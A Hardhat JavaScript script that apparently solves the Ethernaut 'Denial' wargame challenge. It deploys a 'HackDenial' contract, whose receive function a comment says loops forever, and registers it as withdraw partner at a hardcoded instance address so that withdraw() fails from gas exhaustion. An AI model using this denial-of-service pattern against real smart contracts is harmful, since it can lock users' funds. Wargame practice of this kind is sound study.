const { ethers } = require("hardhat");
const hre = require("hardhat");


async function solve(instance_address, account) {

    const Denial = await ethers.getContractFactory("Denial");
    const denial = Denial.attach(instance_address);

    console.log('Deploying HackDenial contract...');
    const HackDenial = await ethers.getContractFactory("HackDenial");
    const contract = await HackDenial.deploy();
    await contract.deployed();

    // The receieve function on contract should contain an infinite loop
    // setWithdrawPartner(contract.address)
    console.log('Calling setWithdrawPartner...');
    let tx = await denial.setWithdrawPartner(contract.address);
    await tx.wait(10);

    console.log('This should fail...');
    tx = await denial.withdraw();
    await tx.wait(10);

    console.log('Success!')

}


async function main() {

    const [account] = await ethers.getSigners();
    console.log(`Account address: ${account.address}`);
    console.log('');

    instance_address = '0x19AcbF76ECfbF2255b0D2719a7BF49627DAc6a80';

    await solve(instance_address, account);

}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
